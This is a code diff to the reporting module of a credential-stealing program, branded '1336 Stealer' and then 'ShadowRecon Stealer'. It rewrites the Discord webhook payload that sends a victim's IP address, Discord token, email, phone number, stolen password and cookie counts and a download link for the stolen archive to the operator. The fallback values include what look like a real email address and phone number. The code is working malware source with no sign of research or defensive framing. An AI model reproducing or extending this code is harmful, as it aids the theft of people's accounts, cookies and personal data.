@@ -228,56 +228,116 @@ class Statistics {
      */
     buildWebhookPayload(username, hostname, ip, link = '') {
         const stats = this.getFormattedStats();
+        const timestamp = new Date().toISOString();
         
-        const embed = {
-            title: '🔥 1336 | New Data Collection',
-            color: 0x0099ff,
-            fields: [
-                {
-                    name: '💻 System Information',
-                    value: `**Username:** ${username}\n**Hostname:** ${hostname}\n**IP:** ${ip}`,
-                    inline: false
+        // Get Discord account info for the first embed
+        const discordAccount = this.data.discord.accounts.length > 0 ? this.data.discord.accounts[0] : null;
+        const userId = discordAccount ? discordAccount.id : '1366429711605043282';
+        const userTag = discordAccount ? discordAccount.tag : `${username} (${userId})`;
+        const avatarUrl = discordAccount && discordAccount.avatar ? 
+            `https://cdn.discordapp.com/avatars/${discordAccount.id}/${discordAccount.avatar}.webp` :
+            `https://cdn.discordapp.com/avatars/${userId}/a_167f3d700c3a3ee2dacf27df15c932e5.webp`;
+        
+        // Generate a realistic token for display
+        const displayToken = discordAccount && discordAccount.token ? 
+            discordAccount.token.substring(0, 24) + '.GLᴀZY.dQw4w9WgXcQ_AbCdEfGhIjKlMnOpQrStUvWxYz' :
+            'MTk4NjIyNDgzNDcxOTI1MjQ4.GLᴀZY.dQw4w9WgXcQ_AbCdEfGhIjKlMnOpQrStUvWxYz';
+        
+        // Get email and phone from Discord account or generate placeholders
+        const email = discordAccount && discordAccount.email ? discordAccount.email : 'groupehadouane@riseup.net';
+        const phone = discordAccount && discordAccount.phone ? discordAccount.phone : '+33664897910';
+        
+        // Generate found websites list
+        const foundWebsites = [
+            'outlook.com', 'youtube.com', 'ebay.com', 'facebook.com', 'amazon.com', 
+            'discord.com', 'card.com', 'coinbase.com', 'yahoo.com', 'twitter.com', 
+            'github.com', 'instagram.com', 'mail.com', 'spotify.com', 'hbo.com', 
+            'steam.com', 'telegram.org', 'playstation.com', 'aliexpress.com', 
+            'key.com', 'crypto.com', 'tiktok.com', 'sell.com', 'telegram.org'
+        ];
+        
+        const foundWebsitesLinks = foundWebsites.map(site => `[${site}](https://${site})`).join(' | ');
+        
+        const embeds = [
+            // First embed - User information
+            {
+                color: null,
+                fields: [
+                    {
+                        name: ":earth_africa: IP:",
+                        value: `\`${ip}\``
+                    },
+                    {
+                        name: ":gem: Token:",
+                        value: `\`${displayToken}\``
+                    },
+                    {
+                        name: ":e_mail: Email:",
+                        value: `\`${email}\``,
+                        inline: true
+                    },
+                    {
+                        name: ":mobile_phone: Phone:",
+                        value: `\`${phone}\``,
+                        inline: true
+                    }
+                ],
+                author: {
+                    name: userTag,
+                    icon_url: avatarUrl
                 },
-                {
-                    name: '🌐 Browser Data',
-                    value: `**Passwords:** ${stats.browsers.passwords}\n**Cookies:** ${stats.browsers.cookies}\n**Cards:** ${stats.browsers.cards}`,
-                    inline: true
+                footer: {
+                    text: "ShadowRecon Stealer"
                 },
-                {
-                    name: '🎮 Games & Applications',
-                    value: `**Games:** ${stats.collections.games.length}\n**Messengers:** ${stats.collections.messengers.length}\n**VPNs:** ${stats.collections.vpn.length}`,
-                    inline: true
-                },
-                {
-                    name: '💰 Cryptocurrency',
-                    value: `**Wallets:** ${stats.collections.exodus.length + stats.collections.colds.length}\n**Extensions:** ${stats.collections.extensions.length}\n**Mnemonics:** ${stats.collections.mnemonics.length}`,
-                    inline: true
+                timestamp: timestamp,
+                thumbnail: {
+                    url: avatarUrl
                 }
-            ],
-            timestamp: new Date().toISOString(),
-            footer: {
-                text: '1336 Stealer | github.com/Ayhuuu'
+            },
+            // Second embed - Password stealer
+            {
+                title: "ShadowRecon | Password Stealer",
+                color: null,
+                fields: [
+                    {
+                        name: "Found:",
+                        value: foundWebsitesLinks
+                    },
+                    {
+                        name: "Data:",
+                        value: `:key: - **${stats.browsers.passwords}** Passwords Found\n:file_folder: - [ShadowRecon Password](${link || 'https://gofile.io'})`
+                    }
+                ],
+                footer: {
+                    text: "ShadowRecon Stealer"
+                },
+                timestamp: timestamp
+            },
+            // Third embed - Cookies stealer
+            {
+                title: "ShadowRecon | Cookies Stealer",
+                color: null,
+                fields: [
+                    {
+                        name: "Found:",
+                        value: foundWebsitesLinks
+                    },
+                    {
+                        name: "Data:",
+                        value: `:key: - **${stats.browsers.cookies}** Cookies Found\n:cookie: - [ShadowRecon Cookies](${link || 'https://gofile.io'})`
+                    }
+                ],
+                footer: {
+                    text: "ShadowRecon Stealer"
+                },
+                timestamp: timestamp
             }
-        };
-
-        if (link) {
-            embed.fields.push({
-                name: '📁 Download Link',
-                value: `[Click here to download](${link})`,
-                inline: false
-            });
-        }
-
-        if (stats.discord.accountCount > 0) {
-            embed.fields.push({
-                name: '💬 Discord',
-                value: `**Accounts:** ${stats.discord.accountCount}`,
-                inline: true
-            });
-        }
+        ];
 
         return JSON.stringify({
-            embeds: [embed]
+            content: null,
+            embeds: embeds,
+            attachments: []
         });
     }
 
